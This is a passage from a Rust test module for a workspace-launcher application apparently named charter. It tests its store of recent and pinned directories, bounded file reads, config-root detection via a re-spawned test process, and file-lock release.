        std::fs::create_dir_all(&not_a_plane).unwrap();
        let a_file = held.path().join("file");
        std::fs::write(&a_file, b"x").unwrap();
        let linked = held.path().join("linked");
        std::os::unix::fs::symlink(a_plane(&held.path().join("real")), &linked).unwrap();

        assert!(still_a_plane(&gone).is_err_and(|why| why.contains("no longer there")));
        assert!(still_a_plane(&not_a_plane).is_err_and(|why| why.contains("not a plane")));
        assert!(still_a_plane(&a_file).is_err_and(|why| why.contains("not a directory")));
        assert!(still_a_plane(&linked).is_err_and(|why| why.contains("symlink")));
    }

    #[test]
    fn reading_the_store_never_touches_the_planes_it_names() {
        // The reason `still_a_plane` is a separate question: a cold launch that stats sixty
        // paths hangs on the first dead network mount, with nothing drawn to say so.
        let machine = machine();
        let mut store = Store::default();
        store.remember(Path::new("/planes/nothing-is-here"), 1);
        write(machine.path(), &store).unwrap();

        let back = read(machine.path());

        assert_eq!(
            back.store.recents.len(),
            1,
            "a path that does not exist is still remembered; whether to show it is a \
             separate question asked per row"
        );
    }

    #[test]
    fn unix_has_an_expression_for_the_mode_so_nothing_here_refuses() {
        // The other side of it is not testable from here: off unix the whole store refuses
        // (ADR 0031, charter-app#98) and this module's tests do not compile at all.
        // What that platform does is one sentence, and `supported` is where it is said.
        assert!(supported().is_ok());
    }

    #[test]
    fn a_dropped_entry_says_which_bound_it_is_past() {
        assert_eq!(
            Room::why(true),
            format!("is past the {MOST_PINNED} projects charter pins")
        );
        assert_eq!(
            Room::why(false),
            format!("is past the {MOST_RECENTS} planes charter remembers")
        );
    }

    /// Set in a child this test binary starts, which answers from its own environment.
    const ROOT_CHILD: &str = "CHARTER_TEST_MACHINE_ROOT_CHILD";

    #[test]
    fn the_config_home_is_read_from_this_processs_own_environment() {
        if let Some(want) = std::env::var_os(ROOT_CHILD) {
            assert_eq!(config_root(), Some(PathBuf::from(want)));
            return;
        }
        // `config_root` reads the real variables, which a test can only set by starting a
        // process with them; `rooted` above is the ladder, and this is the reading of it.
        let home = machine();
        let out = crate::forklock::output(
            std::process::Command::new(std::env::current_exe().unwrap())
                .args([
                    "--exact",
                    "machine::tests::the_config_home_is_read_from_this_processs_own_environment",
                    "--test-threads=1",
                ])
                .env(ROOT_CHILD, home.path())
                .env(HOME_VAR, home.path()),
        )
        .unwrap();
        assert!(
            out.status.success(),
            "{}\n{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            String::from_utf8_lossy(&out.stdout).contains("1 passed"),
            "{}",
            String::from_utf8_lossy(&out.stdout)
        );
    }

    #[test]
    fn a_change_is_said_as_what_it_is_about_and_what_happened_to_it() {
        assert_eq!(
            Change::PluginAdded("market@repo".into()).to_string(),
            "the plugin market@repo is new"
        );
        assert_eq!(
            Change::EnvChanged("PATH".into()).to_string(),
            "the environment variable PATH has a different value"
        );
        assert_eq!(Change::ProfileRemoved("work".into()).name(), "work");
    }

    #[test]
    fn unpinning_is_never_refused_for_want_of_room_to_pin() {
        let mut store = Store::default();
        let planes: Vec<PathBuf> = (0..=MOST_PINNED)
            .map(|i| PathBuf::from(format!("/planes/p{i}")))
            .collect();
        for (i, plane) in planes.iter().enumerate() {
            store.remember(plane, 1_758_000_000 + i as u64);
        }
        for plane in &planes[..MOST_PINNED] {
            assert_eq!(store.pin(plane, true), Ok(true));
        }
        let last = &planes[MOST_PINNED];
        assert!(store.pin(last, true).is_err(), "no room to pin one more");
        assert_eq!(
            store.pin(last, false),
            Ok(false),
            "and asking to unpin what is not pinned is no change, not a refusal"
        );
    }

    #[test]
    fn a_file_beside_the_store_is_read_up_to_its_bound_and_not_one_byte_past() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(dir(machine.path()).join("five"), "12345").unwrap();
        std::fs::write(dir(machine.path()).join("six"), "123456").unwrap();

        assert_eq!(
            read_beside(machine.path(), "five", 5, "a test file").unwrap(),
            Some("12345".to_owned())
        );
        assert!(read_beside(machine.path(), "six", 5, "a test file").is_err());
    }

    #[test]
    fn a_pinned_workspace_name_may_be_as_long_as_a_file_name_and_no_longer() {
        assert!(usable_workspace(&"a".repeat(LONGEST_WORKSPACE_NAME)).is_ok());
        assert!(usable_workspace(&"a".repeat(LONGEST_WORKSPACE_NAME + 1)).is_err());
    }

    #[test]
    fn a_recent_that_is_not_an_object_is_not_an_entry_and_an_empty_one_is_an_empty_path() {
        let mut dropped = Vec::new();
        load(&serde_json::json!({"recents": [5, {}]}), &mut dropped);
        assert_eq!(
            dropped,
            vec![
                Dropped::Recent {
                    plane: String::new(),
                    why: "is not an entry charter wrote".into(),
                },
                Dropped::Recent {
                    plane: String::new(),
                    why: "is empty".into(),
                },
            ]
        );
    }

    #[test]
    fn the_lock_is_let_go_even_where_a_copy_of_its_descriptor_lives_on() {
        // `flock` belongs to the open file description, so a descriptor a forked child
        // inherited would hold it past the close. The unlock is what lets it go regardless.
        let machine = machine();
        let lock = Lock::on(machine.path());
        let copy = lock
            .0
            .as_ref()
            .expect("the lock was taken")
            .try_clone()
            .unwrap();

        drop(lock);

        let again = std::fs::File::open(dir(machine.path()).join(LOCK)).unwrap();
        assert!(
            rustix::fs::flock(&again, rustix::fs::FlockOperation::NonBlockingLockExclusive).is_ok(),
            "the lock is free once its holder is dropped"
        );
        drop(copy);
    }
}
